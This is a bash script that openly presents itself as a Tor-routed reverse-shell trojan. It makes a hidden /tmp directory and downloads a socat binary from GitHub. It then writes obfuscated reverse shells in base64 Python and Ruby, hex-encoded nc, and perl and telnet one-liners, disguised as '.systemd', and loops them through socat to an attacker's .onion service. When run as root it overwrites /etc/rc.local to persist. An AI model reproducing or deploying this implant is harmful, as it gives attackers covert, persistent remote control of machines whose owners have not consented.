#!/bin/bash
#
##
####
##### Reverse Shell Wrapper, Written with tor servers in mind. Multiple langs for shell.
#### Python, ruby or nc for connect back.
## 
#
##
##################################################################################
#  ██████╗ ███╗   ██╗██╗ ██████╗ ███╗   ██╗███████╗██╗     ██╗ ██████╗███████╗  ##
# ██╔═══██╗████╗  ██║██║██╔═══██╗████╗  ██║██╔════╝██║     ██║██╔════╝██╔════╝ ##
# ██║   ██║██╔██╗ ██║██║██║   ██║██╔██╗ ██║███████╗██║     ██║██║     █████╗   #
# ██║   ██║██║╚██╗██║██║██║   ██║██║╚██╗██║╚════██║██║     ██║██║     ██╔══╝   ##
# ╚██████╔╝██║ ╚████║██║╚██████╔╝██║ ╚████║███████║███████╗██║╚██████╗███████╗  ##            
##################################################################################
#
##
###
#### Merciless, Idiot proof. Awesome.
###
##
#

## Set Variables
# Directory to work in
activeDir="/tmp/.unix-stream"
scBinUrl="https://github.com/kernelzeroday/opparis/blob/master/extra/static-binaries/binaries/linux/x86_64/socat"
# Socat is used to tunnel shell to your hidden service
# Enter your server's .onion url
onion=somehiddenservice.onion
# tor servers incoming port
orPrt=54321
# some harmless name for our trojan
# this is simply a python reverse shell that connects to the localhost through socat. 
# catch it on your tor server with ncat -lvp $orPrt
pName=".systemd"
run=run

# Create a working directory
infect(){

if [[ ! -d $activeDir ]];then
    mkdir $activeDir
fi

cd $activeDir

# Check for presence of socat on system
# Download it if we don't have it
if [ ! $(which socat) == "" ];then
    wget -O $activeDir/socat $scBinUrl
    chmod 775 socat
    socat=".$activeDir/socat"
else
    socat=$(which socat)
fi




# check for python, if not python check for nc, if no nc check for ruby. if no ruby, bail.


if [ ! $(which python) == "" ];then
  using=python
  elif [ ! $(which nc) == "" ];then
      using=nc
      elif [ ! $(which ruby) == "" ];then
          using=ruby
        elif [ ! $(which perl) == "" ];then
            using=perl
              elif [ ! $( which telnet) == "" ];then
                using=telnet
           fi



# if we're using python for our shell...
if [[ $using == "python" ]];then

cat << _EOF_ > $activeDir/$pName
#!/usr/bin/env python
exec('aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzEyNy4wLjAuMScsNDQzMCkpClFvPUZhbHNlCndoaWxlIG5vdCBRbzoKCWRhdGE9c28ucmVjdigxMDI0KQoJaWYgbGVuKGRhdGEpPT0wOgoJCVFvPVRydWUKCXN0ZGluLHN0ZG91dCxzdGRlcnIsPW9zLnBvcGVuMyhkYXRhKQoJc3Rkb3V0X3ZhbHVlPXN0ZG91dC5yZWFkKCkrc3RkZXJyLnJlYWQoKQoJc28uc2VuZChzdGRvdXRfdmFsdWUpCg=='.decode('base64'))
_EOF_

# if we are using nc...
elif [[ $using == "nc" ]];then
cat << _EOF_ > $activeDir/$pName
/bin/echo -ne '\x6d\x6b\x6e\x6f\x64\x20\x2f\x74\x6d\x70\x2f\x78\x75\x69\x74\x20\x70\x3b\x20\x6e\x63\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x20\x34\x34\x33\x30\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x78\x75\x69\x74\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70\x2f\x78\x75\x69\x74\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x78\x75\x69\x74\x20'|sh
_EOF_

# or if we're using ruby...

elif [[ $using == "ruby" ]];then

cat << _EOF_ > $activeDir/$pName
#!/usr/bin/env ruby
code = %(cmVxdWlyZSAnc29ja2V0JztjPVRDUFNvY2tldC5uZXcoIjEyNy4wLjAuMSIsIDQ0MzApOyRzdGRpbi5yZW9wZW4oYyk7JHN0ZG91dC5yZW9wZW4oYyk7JHN0ZGVyci5yZW9wZW4oYyk7JHN0ZGluLmVhY2hfbGluZXt8bHxsPWwuc3RyaXA7bmV4dCBpZiBsLmxlbmd0aD09MDsoSU8ucG9wZW4obCwicmIiKXt8ZmR8IGZkLmVhY2hfbGluZSB7fG98IGMucHV0cyhvLnN0cmlwKSB9fSkgcmVzY3VlIG5pbCB9).unpack(%(m0)).first
if RUBY_PLATFORM =~ /mswin|mingw|win32/
inp = IO.popen(%(ruby), %(wb)) rescue nil
if inp
inp.write(code)
inp.close
end
else
if ! Process.fork()
eval(code) rescue nil
end
end
_EOF_

elif [[ using == perl ]];then

cat << _EOF_ > $activeDir/$pName
perl -e 'use Socket;$i="127.0.0.1";$p=4430;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
_EOF_

elif [[ using == telnet ]];then
cat << _EOF_ > $activeDir/$pName
mknod backpipe p; telnet 127.0.0.1 4430 0<backpipe | /bin/bash 1>backpipe
_EOF_

fi
chmod 755 $activeDir/$pName

# Create a wrapper script
if [[ ! -x $activedir/$run ]];then
cat << _EOF_ > $activeDir/$run
#!/bin/bash
while true
    do
      $socat TCP4-LISTEN:4430,fork SOCKS4a:127.0.0.1:$onion:$orPrt,socksport=9050 &
      sleep 5
      $activeDir/$pName &
      sleep 180
    done
_EOF_
chmod 755 $activeDir/$run
fi


# Make persistent if possible
if [[ $(whoami) == "root" ]];then
    # Hey, its in the beta stage...
    echo "#!/bin/sh" > /etc/rc.local
    echo "/usr/local/sbin/$run" >> /etc/rc.local
    echo "exit0" >> /etc/rc.local
fi


# Run from script in any case
if [[ -x socat ]]
then
    while true
    do
      $socat TCP4-LISTEN:4430,fork SOCKS4a:127.0.0.1:$onion:$orPrt,socksport=9050 &
      $activeDir/$pName &
      sleep 180
    done
fi
}

infect
